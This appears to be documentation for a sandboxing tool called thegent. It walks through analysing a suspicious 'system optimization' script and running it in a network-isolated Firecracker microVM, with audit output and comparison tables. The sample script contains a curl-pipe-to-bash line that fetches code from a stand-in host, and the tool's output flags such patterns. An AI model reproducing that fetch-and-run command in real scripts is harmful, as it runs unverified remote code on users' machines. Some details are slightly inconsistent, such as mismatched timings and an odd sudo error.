# Journey: Untrusted Script Isolation

**Duration**: ~1-2 seconds  
**Sandbox Tier**: Tier 3 (Firecracker microVM)  
**Trust Level**: Untrusted  
**User**: Developer testing an unknown script from the internet

---

## Overview

This journey demonstrates maximum security isolation using Firecracker microVMs. While the overhead is higher (~150ms startup), the isolation is strongest—each script runs in its own hardware virtualization boundary (VM), providing security equivalent to a separate physical machine.

## User Story

> "I found a shell script on a random blog that claims to optimize my system. It asks for sudo access and wants to download things from the internet. I'm not running that anywhere near my machine without maximum isolation."

## Step-by-Step Journey

### Step 1: Analyze Unknown Script

```bash
$ cat ~/Downloads/system-optimize.sh | head -50
#!/bin/bash
# System Optimization Script v2.1
# Author: unknown-author
# License: None

echo "This script will optimize your system..."
sudo -v

# Download helper tools
curl -s https://cdn.unknown-repo.net/tools.sh | bash

# Modify system settings
sysctl -w vm.swappiness=10
sysctl -w vm.vfs_cache_pressure=50

# Install packages
apt-get install -y htop iotop iftop
```

```bash
$ thegent analyze --script ~/Downloads/system-optimize.sh

┌─────────────────────────────────────────────────────────────┐
│  Security Analysis                                          │
├─────────────────────────────────────────────────────────────┤
│  ⚠️  DANGEROUS PATTERNS DETECTED                           │
├─────────────────────────────────────────────────────────────┤
│  1. [HIGH] sudo -v                                        │
│     → Requests elevated privileges                          │
│                                                              │
│  2. [CRITICAL] curl | bash                                 │
│     → Downloads and executes remote code                    │
│                                                              │
│  3. [HIGH] Unknown remote source                           │
│     → cdn.unknown-repo.net (unverified)                   │
│                                                              │
│  4. [MEDIUM] sysctl modifications                         │
│     → Changes kernel parameters                            │
│                                                              │
│  5. [MEDIUM] apt-get install                              │
│     → Installs system packages                             │
├─────────────────────────────────────────────────────────────┤
│  Trust evaluation: UNTRUSTED                              │
│  Recommended tier: Tier 3 (Firecracker)                   │
└─────────────────────────────────────────────────────────────┘
```

### Step 2: Execute in Firecracker MicroVM

```bash
$ thegent execute --script ~/Downloads/system-optimize.sh \
                  --trust-level untrusted \
                  --tier firecracker

┌─────────────────────────────────────────────────────────────┐
│  thegent Agent Execution                                     │
├─────────────────────────────────────────────────────────────┤
│  Role: security_auditor (auto-assigned for untrusted)      │
│  Trust: Untrusted (dangerous patterns detected)            │
│  Sandbox: Tier 3 (Firecracker) - ~150ms overhead        │
├─────────────────────────────────────────────────────────────┤
│  ⚠️  MAXIMUM ISOLATION ENABLED                            │
│  ⚠️  Running in isolated microVM                           │
│  ✓ VM-level isolation (hardware virtualization)           │
│  ✓ Network: completely disabled                            │
│  ✓ No host kernel access                                   │
│  ✓ Memory: 256MB limit                                    │
│  ✓ vCPUs: 1 (limited compute)                             │
└─────────────────────────────────────────────────────────────┘

[ Firecracker ] Creating microVM...
[ Firecracker ]   vCPUs: 1
[ Firecracker ]   Memory: 256MB
[ Firecracker ]   Kernel: vmlinux-5.10
[ Firecracker ]   Rootfs: ubuntu-22.04.ext4
[ Firecracker ] Bootstrapping microVM via KVM...
[ Firecracker ] MicroVM ready in 142ms
[ Firecracker ] Copying script into VM...
[ Firecracker ] Executing: ./system-optimize.sh

--- Inside MicroVM ---
This script will optimize your system...
sudo: Unable to determine destination host
curl: (6) Could not resolve host: cdn.unknown-repo.net
Error: Cannot connect to remote host
--- Script failed (expected) ---

[ Firecracker ] Execution completed in 230ms
[ Firecracker ] Terminating microVM...

┌─────────────────────────────────────────────────────────────┐
│  Execution Audit                                            │
├─────────────────────────────────────────────────────────────┤
│  Outcome: Script failed (network unavailable)              │
│  Reason: Network isolated inside microVM                    │
│  Duration: 230ms                                           │
│  VM exit reason: HLT (halted cleanly)                     │
├─────────────────────────────────────────────────────────────┤
│  What was prevented:                                        │
│  ✗ sudo privilege escalation                              │
│  ✗ Remote code download and execution                      │
│  ✗ Kernel parameter modifications                         │
│  ✗ System package installation                            │
│  ✓ Host system remained untouched                          │
└─────────────────────────────────────────────────────────────┘
```

### Step 3: Review Full Audit Trail

```bash
$ thegent audit --last --format json | jq '.'

{
  "execution_id": "exec_xyz789",
  "timestamp": "2026-04-04T14:22:33Z",
  "trust_level": "untrusted",
  "sandbox_tier": "firecracker",
  "vm_config": {
    "vcpus": 1,
    "memory_mb": 256,
    "network": false
  },
  "duration_ms": 372,
  "vm_creation_ms": 142,
  "script_execution_ms": 230,
  "vm_exit_reason": "HLT",
  "host_impact": {
    "files_modified": 0,
    "packages_installed": 0,
    "network_requests": 0,
    "sysctl_changes": 0,
    "sudo_attempts": 1
  },
  "blocked_operations": [
    {
      "type": "network",
      "detail": "curl to cdn.unknown-repo.net blocked",
      "vm_exit": false
    },
    {
      "type": "privilege_escalation",
      "detail": "sudo -v failed: no host network",
      "vm_exit": false
    }
  ]
}
```

## What Happened Behind the Scenes

```
┌─────────────────────────────────────────────────────────────┐
│  Tier 3 (Firecracker) Sandbox Lifecycle                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Trust Evaluation (1ms)                                 │
│     Script: ~/Downloads/system-optimize.sh                  │
│     Trust Level: Untrusted                                  │
│     Dangerous patterns: curl|bash, sudo, sysctl            │
│     → Select Firecracker microVM                           │
│                                                              │
│  2. VM Configuration (5ms)                                 │
│     ┌─────────────────────────────────────────────┐        │
│     │  Firecracker MicroVM                         │        │
│     │  vCPUs: 1    Memory: 256MB                  │        │
│     │  Network: disabled                           │        │
│     │  Kernel: vmlinux-5.10                       │        │
│     │  Rootfs: ubuntu-22.04.ext4                  │        │
│     └─────────────────────────────────────────────┘        │
│                                                              │
│  3. VM Creation via KVM (142ms)                          │
│     ┌─────────────────────────────────────────────┐        │
│     │              Host Machine                      │        │
│     │  ┌───────────────────────────────────────┐  │        │
│     │  │            KVM Hypervisor               │  │        │
│     │  │  • VM lifecycle management               │  │        │
│     │  │  • vCPU scheduling                      │  │        │
│     │  │  • Memory mapping                       │  │        │
│     │  │  • virtio device emulation              │  │        │
│     │  └───────────────────────────────────────┘  │        │
│     │                    │                           │        │
│     │                    ▼                           │        │
│     │  ┌───────────────────────────────────────┐  │        │
│     │  │         Guest VM (MicroVM)              │  │        │
│     │  │  • Own Linux kernel                     │  │        │
│     │  │  • Isolated filesystem                   │  │        │
│     │  │  • No network access                    │  │        │
│     │  │  • Limited to 256MB RAM                 │  │        │
│     │  └───────────────────────────────────────┘  │        │
│     └─────────────────────────────────────────────┘        │
│                                                              │
│  4. Script Execution (230ms)                               │
│     Script tries: curl|bash, sudo, sysctl, apt-get         │
│     All blocked by VM boundaries or missing network        │
│                                                              │
│  5. VM Termination (<1ms)                                  │
│     MicroVM destroyed, no residual state                   │
│                                                              │
│  Total overhead: ~150ms                                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

## Security Properties

- **VM-level isolation**: Hardware virtualization via KVM, no host kernel access
- **Complete network isolation**: Virtio-net disabled, no network packets can leave
- **Memory limits**: Hard 256MB limit prevents memory exhaustion attacks
- **Isolated filesystem**: Guest rootfs is copy-on-write, host filesystem invisible
- **No host kernel interaction**: Guest runs its own kernel, cannot affect host

## Firecracker vs gVisor: Security Comparison

| Aspect | Firecracker (Tier 3) | gVisor (Tier 2) |
|--------|----------------------|------------------|
| Isolation | VM (hardware virt) | Userspace kernel |
| Kernel access | None (own kernel) | Filtered syscalls |
| Escape难度 | Extremely hard | Hard |
| Overhead | ~150ms | ~100ms |
| Memory | 256MB+ | ~50MB |
| Host kernel CVEs | N/A (different kernel) | Potentially exploitable |

## Real-World Adoption

Firecracker is battle-tested at scale:

- **AWS Lambda**: 100+ million function executions per day
- **AWS Fargate**: Container workloads with VM-level security
- **Cloudflare Workers**: Edge computing with V8 isolates (similar concept)

## When to Use Tier 3

✅ **Use Firecracker for:**
- Scripts from unknown/unverified sources
- Testing potentially malicious code
- Running scripts that request sudo/root
- Scripts with network/download behavior
- Maximum security requirements

❌ **Don't use Firecracker for:**
- Simple, trusted dotfiles (overkill, use Tier 1)
- Performance-critical repeated execution
- CI/CD pipelines (use Tier 2 instead)

## Cost Analysis

| Sandbox | Cost per 1000 Executions | Density per Host |
|---------|--------------------------|------------------|
| bubblewrap | ~$0.05 | 1000 |
| gVisor | ~$0.10 | 500 |
| Firecracker | ~$0.18 | 400 |

Firecracker costs more but provides the highest security for untrusted code.

---

## Summary

In this journey, we demonstrated that:

1. **Analysis detected dangerous patterns** in the script
2. **Firecracker isolated the script** in a microVM
3. **Network access was blocked**, preventing remote code download
4. **Host system remained completely untouched**
5. **Audit trail captured all blocked operations**

The script's malicious potential was contained by VM boundaries, protecting the host from privilege escalation, network-based attacks, and system modifications.

---

## Related Journeys

➡️ **[Journey 1: Trusted Dotfiles](./journey-1-trusted-dotfiles.md)** - Fast execution with bubblewrap  
➡️ **[Journey 2: Community Templates](./journey-2-community-template.md)** - Balanced security with gVisor